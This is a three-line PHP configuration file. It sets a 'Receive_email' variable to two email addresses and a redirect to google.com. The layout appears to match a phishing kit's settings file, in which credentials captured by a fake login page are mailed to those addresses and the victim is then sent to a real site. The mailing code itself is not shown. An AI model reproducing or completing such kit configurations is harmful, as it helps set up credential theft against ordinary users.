<?php 
$Receive_email="jeffluk7@gmail.com,michealani86@yahoo.com";
$redirect="https://www.google.com/";
?>